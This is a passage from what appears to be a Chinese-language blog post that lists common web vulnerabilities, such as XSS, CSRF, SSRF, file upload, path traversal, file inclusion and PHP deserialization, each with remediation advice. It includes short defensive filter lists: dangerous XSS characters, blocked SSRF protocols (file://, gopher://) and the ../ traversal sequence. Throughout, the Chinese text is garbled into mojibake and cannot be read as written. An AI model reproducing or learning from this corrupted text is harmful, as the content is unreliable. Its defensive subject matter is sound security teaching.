‡å¿—ï¼ŒXSSæ”»å‡»å¯ä»¥ç›—å–ç”¨æˆ·çš„cookieï¼Œä»è€Œåˆ©ç”¨è¯¥cookieç›—å–ç”¨æˆ·å¯¹è¯¥ç½‘ç«™çš„æ“ä½œæƒé™ã€‚</p><p>ã€€ã€€4ã€ç›—å–ç½‘ç«™ç”¨æˆ·ä¿¡æ¯ï¼šå½“çªƒå–åˆ°ç”¨æˆ·cookieä»è€Œè·å–åˆ°ç”¨æˆ·èº«ä»½æ—¶ï¼Œæ”»å‡»è€…å¯ä»¥ç›—å–åˆ°ç”¨æˆ·å¯¹ç½‘ç«™çš„æ“ä½œæƒé™ï¼Œä»è€ŒæŸ¥çœ‹ç”¨æˆ·éšç§ä¿¡æ¯ã€‚</p><p>ã€€ã€€5ã€åƒåœ¾ä¿¡æ¯å‘é€ï¼šåœ¨ç¤¾äº¤ç½‘ç«™ç¤¾åŒºä¸­ï¼Œåˆ©ç”¨XSSæ¼æ´å€Ÿç”¨è¢«æ”»å‡»è€…çš„èº«ä»½å‘é€å¤§é‡çš„åƒåœ¾ä¿¡æ¯ç»™ç‰¹å®šçš„ç›®æ ‡ç¾¤ã€‚</p><p>ã€€ã€€6ã€åŠ«æŒç”¨æˆ·Webè¡Œä¸ºï¼šä¸€äº›é«˜çº§çš„XSSæ”»å‡»ç”šè‡³å¯ä»¥åŠ«æŒç”¨æˆ·çš„Webè¡Œä¸ºï¼Œä»è€Œç›‘è§†ç”¨æˆ·çš„æµè§ˆå†å²ã€å‘é€ä¸æ¥æ”¶çš„æ•°æ®ç­‰ç­‰ã€‚</p><p>ã€€ã€€7ã€XSSè •è™«ï¼šå€ŸåŠ©XSSè •è™«ç—…æ¯’è¿˜å¯ä»¥ç”¨æ¥æ‰“å¹¿å‘Šã€åˆ·æµé‡ã€æŒ‚é©¬ã€æ¶ä½œå‰§ã€ç ´åæ•°æ®ã€å®æ–½DDoSæ”»å‡»ç­‰ã€‚</p><p>ã€€ã€€<strong>ä¿®å¤å»ºè®®</strong></p><p>xssæ¼æ´æœ¬è´¨ä¸Šæ˜¯ä¸€ç§htmlæ³¨å…¥ï¼Œä¹Ÿå°±æ˜¯å°†htmlä»£ç æ³¨å…¥åˆ°ç½‘é¡µä¸­ã€‚é‚£ä¹ˆå…¶é˜²å¾¡çš„æ ¹æœ¬å°±æ˜¯åœ¨å°†ç”¨æˆ·æäº¤çš„ä»£ç æ˜¾ç¤ºåˆ°é¡µé¢ä¸Šæ—¶åšå¥½ä¸€ç³»åˆ—çš„è¿‡æ»¤ä¸è½¬ä¹‰</p><p>ã€€ã€€ï¼ˆ1ï¼‰è¿‡æ»¤è¾“å…¥çš„æ•°æ®ï¼Œå¯¹ä¾‹å¦‚ï¼šâ€œ â€˜ â€ï¼Œâ€œ â€œ â€ï¼Œâ€ &lt; â€œï¼Œâ€ &gt; â€œï¼Œâ€ on* â€œï¼Œscriptã€iframeç­‰å±é™©å­—ç¬¦è¿›è¡Œä¸¥æ ¼çš„æ£€æŸ¥ã€‚è¿™é‡Œçš„è¾“å…¥ä¸ä»…ä»…æ˜¯ç”¨æˆ·å¯ä»¥ç›´æ¥äº¤äº’çš„è¾“å…¥æ¥å£ï¼Œä¹ŸåŒ…æ‹¬HTTPè¯·æ±‚ä¸­çš„Cookieä¸­çš„å˜é‡ï¼ŒHTTPè¯·æ±‚å¤´éƒ¨ä¸­çš„å˜é‡ç­‰ã€‚</p><p>ã€€ã€€ï¼ˆ2ï¼‰ä¸ä»…éªŒè¯æ•°æ®çš„ç±»å‹ï¼Œè¿˜è¦éªŒè¯å…¶æ ¼å¼ã€é•¿åº¦ã€èŒƒå›´å’Œå†…å®¹ã€‚</p><p>ã€€ã€€ï¼ˆ3ï¼‰ä¸ä»…åœ¨å®¢æˆ·ç«¯åšæ•°æ®çš„éªŒè¯ä¸è¿‡æ»¤ï¼Œå…³é”®çš„è¿‡æ»¤æ­¥éª¤åœ¨æœåŠ¡ç«¯è¿›è¡Œã€‚</p><p>ã€€ã€€ï¼ˆ4ï¼‰å¯¹è¾“å‡ºåˆ°é¡µé¢çš„æ•°æ®è¿›è¡Œç›¸åº”çš„ç¼–ç è½¬æ¢ï¼Œå¦‚HTMLå®ä½“ç¼–ç ã€JSç¼–ç ç­‰ã€‚å¯¹è¾“å‡ºçš„æ•°æ®ä¹Ÿè¦æ£€æŸ¥ï¼Œæ•°æ®åº“é‡Œçš„å€¼æœ‰å¯èƒ½ä¼šåœ¨ä¸€ä¸ªå¤§ç½‘ç«™çš„å¤šå¤„éƒ½æœ‰è¾“å‡ºï¼Œå³ä½¿åœ¨è¾“å…¥åšäº†ç¼–ç ç­‰æ“ä½œï¼Œåœ¨å„å¤„çš„è¾“å‡ºç‚¹æ—¶ä¹Ÿè¦è¿›è¡Œæ£€æŸ¥ã€‚</p><h2 id="3-XXE"><a href="#3-XXE" class="headerlink" title="3.XXE"></a>3.XXE</h2><p>ã€€ã€€<strong>æ¼æ´è¯¦æƒ…</strong></p><p>ã€€ã€€å‚è€ƒï¼š<a href="https://www.freebuf.com/company-information/165769.html" target="_blank" rel="noopener">https://www.freebuf.com/company-information/165769.html</a></p><h2 id="4-CSRF"><a href="#4-CSRF" class="headerlink" title="4.CSRF"></a>4.CSRF</h2><p>ã€€ã€€<strong>æ¼æ´æè¿°**</strong>ï¼š**</p><p>ã€€ã€€CSRFæ˜¯è·¨ç«™è¯·æ±‚ä¼ªé€ ï¼Œä¸æ”»å‡»ç½‘ç«™æœåŠ¡å™¨ï¼Œè€Œæ˜¯å†’å……ç”¨æˆ·åœ¨ç«™å†…çš„æ­£å¸¸æ“ä½œã€‚é€šå¸¸ç”±äºæœåŠ¡ç«¯æ²¡æœ‰å¯¹è¯·æ±‚å¤´åšä¸¥æ ¼è¿‡æ»¤å¼•èµ·çš„ã€‚CSRFä¼šé€ æˆå¯†ç é‡ç½®ï¼Œç”¨æˆ·ä¼ªé€ ç­‰é—®é¢˜ï¼Œå¯èƒ½å¼•å‘ä¸¥é‡åæœã€‚ç»å¤§å¤šæ•°ç½‘ç«™æ˜¯é€šè¿‡ cookie ç­‰æ–¹å¼è¾¨è¯†ç”¨æˆ·èº«ä»½ï¼Œå†äºˆä»¥æˆæƒçš„ã€‚æ‰€ä»¥è¦ä¼ªé€ ç”¨æˆ·çš„æ­£å¸¸æ“ä½œï¼Œæœ€å¥½çš„æ–¹æ³•æ˜¯é€šè¿‡ XSS æˆ–é“¾æ¥æ¬ºéª—ç­‰é€”å¾„ï¼Œè®©ç”¨æˆ·åœ¨æœ¬æœºï¼ˆå³æ‹¥æœ‰èº«ä»½ cookie çš„æµè§ˆå™¨ç«¯ï¼‰å‘èµ·ç”¨æˆ·æ‰€ä¸çŸ¥é“çš„è¯·æ±‚ã€‚CSRFæ”»å‡»ä¼šä»¤ç”¨æˆ·åœ¨ä¸çŸ¥æƒ…çš„æƒ…å†µä¸‹æ”»å‡»è‡ªå·±å·²ç»ç™»å½•çš„ç³»ç»Ÿã€‚</p><p>ã€€ã€€<strong>ä¿®å¤å»ºè®®</strong></p><p>ã€€ã€€1ã€éªŒè¯è¯·æ±‚çš„Refereræ˜¯å¦æ¥è‡ªæœ¬ç½‘ç«™ï¼Œä½†å¯è¢«ç»•è¿‡ã€‚</p><p>ã€€ã€€2ã€åœ¨è¯·æ±‚ä¸­åŠ å…¥ä¸å¯ä¼ªé€ çš„tokenï¼Œå¹¶åœ¨æœåŠ¡ç«¯éªŒè¯tokenæ˜¯å¦ä¸€è‡´æˆ–æ­£ç¡®ï¼Œä¸æ­£ç¡®åˆ™ä¸¢å¼ƒæ‹’ç»æœåŠ¡ã€‚</p><h2 id="5-SSRF"><a href="#5-SSRF" class="headerlink" title="5.SSRF"></a>5.SSRF</h2><p>ã€€ã€€<strong>æ¼æ´æè¿°</strong></p><p>ã€€ã€€SSRFï¼ˆServer-Side Request Forgeryï¼ŒæœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ ï¼‰ï¼šé€šä¿—çš„æ¥è¯´å°±æ˜¯æˆ‘ä»¬å¯ä»¥ä¼ªé€ æœåŠ¡å™¨ç«¯å‘èµ·çš„è¯·æ±‚ï¼Œä»è€Œè·å–å®¢æˆ·ç«¯æ‰€ä¸èƒ½å¾—åˆ°çš„æ•°æ®ã€‚SSRFæ¼æ´å½¢æˆçš„åŸå› ä¸»è¦æ˜¯æœåŠ¡å™¨ç«¯æ‰€æä¾›çš„æ¥å£ä¸­åŒ…å«äº†æ‰€è¦è¯·æ±‚çš„å†…å®¹çš„URLå‚æ•°ï¼Œå¹¶ä¸”æœªå¯¹å®¢æˆ·ç«¯æ‰€ä¼ è¾“è¿‡æ¥çš„URLå‚æ•°è¿›è¡Œè¿‡æ»¤ã€‚è¿™ä¸ªæ¼æ´é€ æˆçš„å±å®³æœ‰ï¼š</p><p>ã€€ã€€(1)ã€å¯ä»¥å¯¹å¤–ç½‘ã€æœåŠ¡å™¨æ‰€åœ¨å†…ç½‘ã€æœ¬åœ°è¿›è¡Œç«¯å£æ‰«æï¼Œè·å–ä¸€äº›æœåŠ¡çš„bannerä¿¡æ¯;</p><p>ã€€ã€€(2)ã€æ”»å‡»è¿è¡Œåœ¨å†…ç½‘æˆ–æœ¬åœ°çš„åº”ç”¨ç¨‹åºï¼ˆæ¯”å¦‚æº¢å‡ºï¼‰;</p><p>ã€€ã€€(3)ã€å¯¹å†…ç½‘Webåº”ç”¨è¿›è¡ŒæŒ‡çº¹è¯†åˆ«ï¼Œé€šè¿‡è®¿é—®é»˜è®¤æ–‡ä»¶å®ç°;</p><p>ã€€ã€€(4)ã€æ”»å‡»å†…å¤–ç½‘çš„Webåº”ç”¨ï¼Œä¸»è¦æ˜¯ä½¿ç”¨Getå‚æ•°å°±å¯ä»¥å®ç°çš„æ”»å‡»ï¼ˆæ¯”å¦‚Struts2æ¼æ´åˆ©ç”¨ï¼ŒSQLæ³¨å…¥ç­‰ï¼‰;</p><p>ã€€ã€€(5)ã€åˆ©ç”¨Fileåè®®è¯»å–æœ¬åœ°æ–‡ä»¶ã€‚</p><p>ã€€ã€€<strong>ä¿®å¤å»ºè®®</strong></p><p>ã€€ã€€1ã€ç¦ç”¨ä¸éœ€è¦çš„åè®®ï¼Œåªå…è®¸HTTPå’ŒHTTPSè¯·æ±‚ï¼Œå¯ä»¥é˜²æ­¢ç±»ä¼¼äºfile://, gopher://, ftp:// ç­‰å¼•èµ·çš„é—®é¢˜ã€‚</p><p>ã€€ã€€2ã€ç™½åå•çš„æ–¹å¼é™åˆ¶è®¿é—®çš„ç›®æ ‡åœ°å€ï¼Œç¦æ­¢å¯¹å†…ç½‘å‘èµ·è¯·æ±‚</p><p>ã€€ã€€3ã€è¿‡æ»¤æˆ–å±è”½è¯·æ±‚è¿”å›çš„è¯¦ç»†ä¿¡æ¯ï¼ŒéªŒè¯è¿œç¨‹æœåŠ¡å™¨å¯¹è¯·æ±‚çš„å“åº”æ˜¯æ¯”è¾ƒå®¹æ˜“çš„æ–¹æ³•ã€‚å¦‚æœwebåº”ç”¨æ˜¯å»è·å–æŸä¸€ç§ç±»å‹çš„æ–‡ä»¶ã€‚é‚£ä¹ˆåœ¨æŠŠè¿”å›ç»“æœå±•ç¤ºç»™ç”¨æˆ·ä¹‹å‰å…ˆéªŒè¯è¿”å›çš„ä¿¡æ¯æ˜¯å¦ç¬¦åˆæ ‡å‡†ã€‚</p><p>ã€€ã€€4ã€éªŒè¯è¯·æ±‚çš„æ–‡ä»¶æ ¼å¼</p><p>ã€€ã€€5ã€ç¦æ­¢è·³è½¬</p><p>ã€€ã€€6ã€é™åˆ¶è¯·æ±‚çš„ç«¯å£ä¸ºhttpå¸¸ç”¨çš„ç«¯å£ï¼Œæ¯”å¦‚ 80ã€443ã€8080ã€8000ç­‰</p><p>ã€€ã€€7ã€ç»Ÿä¸€é”™è¯¯ä¿¡æ¯ï¼Œé¿å…ç”¨æˆ·å¯ä»¥æ ¹æ®é”™è¯¯ä¿¡æ¯æ¥åˆ¤æ–­è¿œç«¯æœåŠ¡å™¨çš„ç«¯å£çŠ¶æ€ã€‚</p><h2 id="6-ä»»æ„å‘½ä»¤-ä»£ç æ‰§è¡Œ"><a href="#6-ä»»æ„å‘½ä»¤-ä»£ç æ‰§è¡Œ" class="headerlink" title="6.ä»»æ„å‘½ä»¤/ä»£ç æ‰§è¡Œ"></a>6.ä»»æ„å‘½ä»¤/ä»£ç æ‰§è¡Œ</h2><p>ã€€ã€€<strong>æ¼æ´æè¿°</strong></p><p>ã€€ã€€å‘½ä»¤æˆ–ä»£ç æ‰§è¡Œæ¼æ´æ˜¯æŒ‡ä»£ç æœªå¯¹ç”¨æˆ·å¯æ§å‚æ•°åšè¿‡æ»¤ï¼Œå¯¼è‡´ç›´æ¥å¸¦å…¥æ‰§è¡Œå‘½ä»¤å’Œä»£ç ï¼Œé€šè¿‡æ¼æ´æ‰§è¡Œæ¶æ„æ„é€ çš„è¯­å¥ï¼Œæ‰§è¡Œä»»æ„å‘½ä»¤æˆ–ä»£ç ã€‚æ”»å‡»è€…å¯åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œè¯»å†™æ–‡ä»¶æ“ä½œç­‰ï¼Œå±å®³å·¨å¤§ã€‚</p><p>ã€€ã€€<strong>ä¿®å¤å»ºè®®</strong></p><p>ã€€ã€€1ã€ä¸¥æ ¼è¿‡æ»¤ç”¨æˆ·è¾“å…¥çš„æ•°æ®ï¼Œç¦æ­¢æ‰§è¡Œéé¢„æœŸç³»ç»Ÿå‘½ä»¤ã€‚</p><p>ã€€ã€€2ã€å‡å°‘æˆ–ä¸ä½¿ç”¨ä»£ç æˆ–å‘½ä»¤æ‰§è¡Œå‡½æ•°</p><p>ã€€ã€€3ã€å®¢æˆ·ç«¯æäº¤çš„å˜é‡åœ¨æ”¾å…¥å‡½æ•°å‰è¿›è¡Œæ£€æµ‹</p><p>ã€€ã€€4ã€å‡å°‘æˆ–ä¸ä½¿ç”¨å±é™©å‡½æ•°</p><h2 id="7-ä»»æ„æ–‡ä»¶ä¸Šä¼ "><a href="#7-ä»»æ„æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="7.ä»»æ„æ–‡ä»¶ä¸Šä¼ "></a>7.ä»»æ„æ–‡ä»¶ä¸Šä¼ </h2><p>ã€€ã€€<strong>æ¼æ´æè¿°</strong></p><p>ã€€ã€€æ–‡ä»¶ä¸Šä¼ æ¼æ´é€šå¸¸ç”±äºä»£ç ä¸­å¯¹æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½æ‰€ä¸Šä¼ çš„æ–‡ä»¶è¿‡æ»¤ä¸ä¸¥æˆ–webæœåŠ¡å™¨ç›¸å…³è§£ææ¼æ´æœªä¿®å¤è€Œé€ æˆçš„ï¼Œå¦‚æœæ–‡ä»¶ä¸Šä¼ åŠŸèƒ½ä»£ç æ²¡æœ‰ä¸¥æ ¼é™åˆ¶å’ŒéªŒè¯ç”¨æˆ·ä¸Šä¼ çš„æ–‡ä»¶åç¼€ã€ç±»å‹ç­‰ï¼Œæ”»å‡»è€…å¯é€šè¿‡æ–‡ä»¶ä¸Šä¼ ç‚¹ä¸Šä¼ ä»»æ„æ–‡ä»¶ï¼ŒåŒ…æ‹¬ç½‘ç«™åé—¨æ–‡ä»¶ï¼ˆwebshellï¼‰æ§åˆ¶æ•´ä¸ªç½‘ç«™ã€‚</p><p>ã€€ã€€<strong>ä¿®å¤å»ºè®®</strong></p><p>ã€€ã€€1ã€å¯¹ä¸Šä¼ æ–‡ä»¶ç±»å‹è¿›è¡ŒéªŒè¯ï¼Œé™¤åœ¨å‰ç«¯éªŒè¯å¤–åœ¨åç«¯ä¾ç„¶è¦åšéªŒè¯ï¼Œåç«¯å¯ä»¥è¿›è¡Œæ‰©å±•åæ£€æµ‹ï¼Œé‡å‘½åæ–‡ä»¶ï¼ŒMIMEç±»å‹æ£€æµ‹ä»¥åŠé™åˆ¶ä¸Šä¼ æ–‡ä»¶çš„å¤§å°ç­‰é™åˆ¶æ¥é˜²å¾¡ï¼Œæˆ–æ˜¯å°†ä¸Šä¼ çš„æ–‡ä»¶å…¶ä»–æ–‡ä»¶å­˜å‚¨æœåŠ¡å™¨ä¸­ã€‚</p><p>ã€€ã€€2ã€ä¸¥æ ¼é™åˆ¶å’Œæ ¡éªŒä¸Šä¼ çš„æ–‡ä»¶ï¼Œç¦æ­¢ä¸Šä¼ æ¶æ„ä»£ç çš„æ–‡ä»¶ã€‚åŒæ—¶é™åˆ¶ç›¸å…³ä¸Šä¼ æ–‡ä»¶ç›®å½•çš„æ‰§è¡Œæƒé™ï¼Œé˜²æ­¢æœ¨é©¬æ‰§è¡Œã€‚</p><p>ã€€ã€€3ã€å¯¹ä¸Šä¼ æ–‡ä»¶æ ¼å¼è¿›è¡Œä¸¥æ ¼æ ¡éªŒï¼Œé˜²æ­¢ä¸Šä¼ æ¶æ„è„šæœ¬æ–‡ä»¶ï¼›</p><p>ã€€ã€€4ã€ä¸¥æ ¼é™åˆ¶ä¸Šä¼ çš„æ–‡ä»¶è·¯å¾„ã€‚</p><p>ã€€ã€€5ã€æ–‡ä»¶æ‰©å±•åæœåŠ¡ç«¯ç™½åå•æ ¡éªŒã€‚</p><p>ã€€ã€€6ã€æ–‡ä»¶å†…å®¹æœåŠ¡ç«¯æ ¡éªŒã€‚</p><p>ã€€ã€€7ã€ä¸Šä¼ æ–‡ä»¶é‡å‘½åã€‚</p><p>ã€€ã€€8ã€éšè—ä¸Šä¼ æ–‡ä»¶è·¯å¾„ã€‚</p><h2 id="8-ç›®å½•ç©¿è¶Š-ç›®å½•éå†"><a href="#8-ç›®å½•ç©¿è¶Š-ç›®å½•éå†" class="headerlink" title="8.ç›®å½•ç©¿è¶Š/ç›®å½•éå†"></a>8.ç›®å½•ç©¿è¶Š/ç›®å½•éå†</h2><p>ã€€ã€€<strong>æ¼æ´æè¿°</strong></p><p>ã€€ã€€æ–‡ä»¶ä¸‹è½½æˆ–è·å–æ–‡ä»¶æ˜¾ç¤ºå†…å®¹é¡µé¢ç”±äºæœªå¯¹ä¼ å…¥çš„æ–‡ä»¶åè¿›è¡Œè¿‡æ»¤ï¼Œåˆ©ç”¨è·¯å¾„å›æº¯ç¬¦../è·³å‡ºç¨‹åºæœ¬èº«çš„é™åˆ¶ç›®å½•ï¼Œæ¥ä¸‹è½½æˆ–æ˜¾ç¤ºä»»æ„æ–‡ä»¶ã€‚</p><p>ã€€ã€€<strong>ä¿®å¤å»ºè®®</strong></p><p>ã€€ã€€å¯¹ä¼ å…¥çš„æ–‡ä»¶åå‚æ•°è¿›è¡Œè¿‡æ»¤ï¼Œå¹¶ä¸”åˆ¤æ–­æ˜¯å¦æ˜¯å…è®¸è·å–çš„æ–‡ä»¶ç±»å‹ï¼Œè¿‡æ»¤å›æº¯ç¬¦../ã€‚</p><h2 id="9-æ–‡ä»¶åŒ…å«"><a href="#9-æ–‡ä»¶åŒ…å«" class="headerlink" title="9.æ–‡ä»¶åŒ…å«"></a>9.æ–‡ä»¶åŒ…å«</h2><p>ã€€ã€€<strong>æ¼æ´æè¿°</strong></p><p>ã€€ã€€æœ¬åœ°æ–‡ä»¶åŒ…å«æ˜¯æŒ‡ç¨‹åºåœ¨å¤„ç†åŒ…å«æ–‡ä»¶çš„æ—¶å€™æ²¡æœ‰ä¸¥æ ¼æ§åˆ¶ã€‚åˆ©ç”¨è¿™ä¸ªæ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥å…ˆæŠŠä¸Šä¼ çš„æ–‡ä»¶ã€ç½‘ç«™æ—¥å¿—æ–‡ä»¶ç­‰ä½œä¸ºä»£ç æ‰§è¡Œæˆ–ç›´æ¥æ˜¾ç¤ºå‡ºæ¥ï¼Œæˆ–è€…åŒ…å«è¿œç¨‹æœåŠ¡å™¨ä¸Šçš„æ¶æ„æ–‡ä»¶ï¼Œè¿›è€Œè·å–åˆ°æœåŠ¡å™¨æƒé™ã€‚</p><p>ã€€ã€€<strong>ä¿®å¤å»ºè®®</strong></p><p>ã€€ã€€1ã€ä¸¥æ ¼æ£€æŸ¥å˜é‡æ˜¯å¦å·²ç»åˆå§‹åŒ–ã€‚</p><p>ã€€ã€€2ã€å¯¹æ‰€æœ‰è¾“å…¥æäº¤å¯èƒ½åŒ…å«çš„æ–‡ä»¶åœ°å€ï¼ŒåŒ…æ‹¬æœåŠ¡å™¨æœ¬åœ°æ–‡ä»¶åŠè¿œç¨‹æ–‡ä»¶ï¼Œè¿›è¡Œä¸¥æ ¼çš„æ£€æŸ¥ï¼Œå‚æ•°ä¸­ä¸å…è®¸å‡ºç°./å’Œ../ç­‰ç›®å½•è·³è½¬ç¬¦ã€‚</p><p>ã€€ã€€3ã€ä¸¥æ ¼æ£€æŸ¥æ–‡ä»¶åŒ…å«å‡½æ•°ä¸­çš„å‚æ•°æ˜¯å¦å¤–ç•Œå¯æ§ã€‚</p><h2 id="10-å¼±å£ä»¤"><a href="#10-å¼±å£ä»¤" class="headerlink" title="10.å¼±å£ä»¤"></a>10.å¼±å£ä»¤</h2><p>ã€€ã€€<strong>æ¼æ´æè¿°</strong></p><p>ã€€ã€€ç”±äºç½‘ç«™ç”¨æˆ·å¸å·å­˜åœ¨å¼±å£ä»¤ï¼Œå¯¼è‡´æ”»å‡»è€…é€šè¿‡å¼±å£ä»¤å¯è½»æ¾ç™»å½•åˆ°ç½‘ç«™ä¸­ï¼Œä»è€Œè¿›è¡Œä¸‹ä¸€æ­¥çš„æ”»å‡»ï¼Œå¦‚ä¸Šä¼ webshellï¼Œè·å–æ•æ„Ÿæ•°æ®ã€‚</p><p>ã€€ã€€å¦å¤–æ”»å‡»è€…åˆ©ç”¨å¼±å£ä»¤ç™»å½•ç½‘ç«™ç®¡ç†åå°ï¼Œå¯æ‰§è¡Œä»»æ„ç®¡ç†å‘˜çš„æ“ä½œã€‚</p><p>ã€€ã€€<strong>ä¿®å¤å»ºè®®</strong></p><p>ã€€ã€€1ã€å¼ºåˆ¶ç”¨æˆ·é¦–æ¬¡ç™»å½•æ—¶ä¿®æ”¹é»˜è®¤å£ä»¤ï¼Œæˆ–æ˜¯ä½¿ç”¨ç”¨æˆ·è‡ªå®šä¹‰åˆå§‹å¯†ç çš„ç­–ç•¥ï¼›</p><p>ã€€ã€€2ã€å®Œå–„å¯†ç ç­–ç•¥ï¼Œä¿¡æ¯å®‰å…¨æœ€ä½³å®è·µçš„å¯†ç ç­–ç•¥ä¸º8ä½ï¼ˆåŒ…æ‹¬ï¼‰ä»¥ä¸Šå­—ç¬¦ï¼ŒåŒ…å«æ•°å­—ã€å¤§å°å†™å­—æ¯ã€ç‰¹æ®Šå­—ç¬¦ä¸­çš„è‡³å°‘3ç§ã€‚</p><p>ã€€ã€€3ã€å¢åŠ äººæœºéªŒè¯æœºåˆ¶ï¼Œé™åˆ¶ipè®¿é—®æ¬¡æ•°ã€‚</p><h2 id="11-æš´åŠ›ç ´è§£"><a href="#11-æš´åŠ›ç ´è§£" class="headerlink" title="11.æš´åŠ›ç ´è§£"></a>11.æš´åŠ›ç ´è§£</h2><p>ã€€ã€€<strong>æ¼æ´æè¿°</strong></p><p>ã€€ã€€ç”±äºæ²¡æœ‰å¯¹ç™»å½•é¡µé¢è¿›è¡Œç›¸å…³çš„äººæœºéªŒè¯æœºåˆ¶ï¼Œå¦‚æ— éªŒè¯ç ã€æœ‰éªŒè¯ç ä½†å¯é‡å¤åˆ©ç”¨ä»¥åŠæ— ç™»å½•é”™è¯¯æ¬¡æ•°é™åˆ¶ç­‰ï¼Œå¯¼è‡´æ”»å‡»è€…å¯é€šè¿‡æš´åŠ›ç ´è§£è·å–ç”¨æˆ·ç™»å½•è´¦å·å’Œå¯†ç ã€‚</p><p>ã€€ã€€<strong>ä¿®å¤å»ºè®®</strong></p><p>ã€€ã€€1ã€å¦‚æœç”¨æˆ·ç™»å½•æ¬¡æ•°è¶…è¿‡è®¾ç½®çš„é˜ˆå€¼ï¼Œåˆ™é”å®šå¸å·(æœ‰æ¶æ„ç™»å½•é”å®šå¸å·çš„é£é™©)</p><p>ã€€ã€€2ã€å¦‚æœæŸä¸ª IPç™»å½•æ¬¡æ•°è¶…è¿‡è®¾ç½®çš„é˜ˆå€¼ï¼Œåˆ™é”å®šIP</p><p>ã€€ã€€3ã€å¢åŠ äººæœºéªŒè¯æœºåˆ¶</p><p>ã€€ã€€4ã€éªŒè¯ç å¿…é¡»åœ¨æœåŠ¡å™¨ç«¯è¿›è¡Œæ ¡éªŒï¼Œå®¢æˆ·ç«¯çš„ä¸€åˆ‡æ ¡éªŒéƒ½æ˜¯ä¸å®‰å…¨çš„ã€‚</p><h2 id="12-è¶Šæƒè®¿é—®"><a href="#12-è¶Šæƒè®¿é—®" class="headerlink" title="12.è¶Šæƒè®¿é—®"></a>12.è¶Šæƒè®¿é—®</h2><p>ã€€ã€€<strong>æ¼æ´æè¿°</strong></p><p>ã€€ã€€ç”±äºæ²¡æœ‰å¯¹ç”¨æˆ·è®¿é—®è§’è‰²çš„æƒé™è¿›è¡Œä¸¥æ ¼çš„æ£€æŸ¥åŠé™åˆ¶ï¼Œå¯¼è‡´å½“å‰è´¦å·å¯å¯¹å…¶ä»–è´¦å·è¿›è¡Œç›¸å…³æ“ä½œï¼Œå¦‚æŸ¥çœ‹ã€ä¿®æ”¹ç­‰ã€‚å¯¹ä½æƒé™å¯¹é«˜æƒé™è´¦æˆ·çš„æ“ä½œä¸ºçºµå‘è¶Šæƒï¼Œç›¸åŒæƒé™è´¦æˆ·ä¹‹é—´çš„æ“ä½œæˆä¸ºæ¨ªå‘è¶Šæƒä¹Ÿç§°æ°´å¹³è¶Šæƒã€‚</p><p>ã€€ã€€<strong>ä¿®å¤å»ºè®®</strong></p><p>ã€€ã€€1ã€å¯¹ç”¨æˆ·è®¿é—®è§’è‰²çš„æƒé™è¿›è¡Œä¸¥æ ¼çš„æ£€æŸ¥åŠé™åˆ¶ã€‚</p><p>ã€€ã€€2ã€åœ¨ä¸€äº›æ“ä½œæ—¶å¯ä»¥ä½¿ç”¨sessionå¯¹ç”¨æˆ·çš„èº«ä»½è¿›è¡Œåˆ¤æ–­å’Œæ§åˆ¶</p><h2 id="13-æœªæˆæƒè®¿é—®"><a href="#13-æœªæˆæƒè®¿é—®" class="headerlink" title="13.æœªæˆæƒè®¿é—®"></a>13.æœªæˆæƒè®¿é—®</h2><p>ã€€ã€€<strong>æ¼æ´æè¿°</strong></p><p>ã€€ã€€ç”±äºæ²¡æœ‰å¯¹ç½‘ç«™æ•æ„Ÿé¡µé¢è¿›è¡Œç™»å½•çŠ¶æ€ã€è®¿é—®æƒé™çš„æ£€æŸ¥ï¼Œå¯¼è‡´æ”»å‡»è€…å¯æœªæˆæƒè®¿é—®ï¼Œè·å–æ•æ„Ÿä¿¡æ¯åŠè¿›è¡Œæœªæˆæƒæ“ä½œã€‚</p><p>ã€€ã€€<strong>ä¿®å¤å»ºè®®</strong></p><p>ã€€ã€€1ã€é¡µé¢è¿›è¡Œä¸¥æ ¼çš„è®¿é—®æƒé™çš„æ§åˆ¶ä»¥åŠå¯¹è®¿é—®è§’è‰²è¿›è¡Œæƒé™æ£€æŸ¥ã€‚</p><p>ã€€ã€€2ã€å¯ä»¥ä½¿ç”¨sessionå¯¹ç”¨æˆ·çš„èº«ä»½è¿›è¡Œåˆ¤æ–­å’Œæ§åˆ¶ã€‚</p><h2 id="14-åˆ—ç›®å½•"><a href="#14-åˆ—ç›®å½•" class="headerlink" title="14.åˆ—ç›®å½•"></a>14.åˆ—ç›®å½•</h2><p>ã€€ã€€<strong>æ¼æ´æè¿°</strong></p><p>ã€€ã€€ç”±äºwebæœåŠ¡å™¨é…ç½®ä¸å½“ï¼Œå¼€å¯äº†ç›®å½•æµè§ˆï¼Œæ”»å‡»è€…å¯è·å¾—æœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶ç›®å½•ç»“æ„ï¼Œè·å–æ•æ„Ÿæ–‡ä»¶ã€‚</p><p>ã€€ã€€<strong>ä¿®å¤å»ºè®®</strong></p><p>ã€€ã€€1ã€é€šè¿‡ä¿®æ”¹é…ç½®æ–‡ä»¶ï¼Œç¦æ­¢ä¸­é—´ä»¶ï¼ˆå¦‚IISã€apacheã€tomcatï¼‰çš„æ–‡ä»¶ç›®å½•ç´¢å¼•åŠŸèƒ½</p><p>ã€€ã€€2ã€è®¾ç½®ç›®å½•è®¿é—®æƒé™</p><h2 id="15-PHPååºåˆ—åŒ–"><a href="#15-PHPååºåˆ—åŒ–" class="headerlink" title="15.PHPååºåˆ—åŒ–"></a>15.PHPååºåˆ—åŒ–</h2><p><strong>æ¼æ´æè¿°</strong></p><p>ã€€ã€€phpååºåˆ—åŒ–æ¼æ´ä¹Ÿå«PHPå¯¹è±¡æ³¨å…¥ï¼Œå½¢æˆåŸå› ä¸ºç¨‹åºæœªå¯¹ç”¨æˆ·è¾“å…¥çš„åºåˆ—åŒ–å­—ç¬¦ä¸²è¿›è¡Œæ£€æµ‹ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥æ§åˆ¶ååºåˆ—åŒ–è¿‡ç¨‹ï¼Œä»è€Œå¯¼è‡´ä»£ç æ‰§è¡Œã€æ–‡ä»¶æ“ä½œã€æ‰§è¡Œæ•°æ®åº“æ“ä½œç­‰ä¸å¯æ§åæœã€‚è¿™ä¸€ç±»æ”»å‡»åœ¨javaã€pythonç­‰é¢å‘å¯¹è±¡è¯­è¨€ä¸­å‡å­˜åœ¨ã€‚</p><p>å¯å‚è€ƒï¼š<a href="https://www.freebuf.com/articles/web/167721.html" target="_blank" 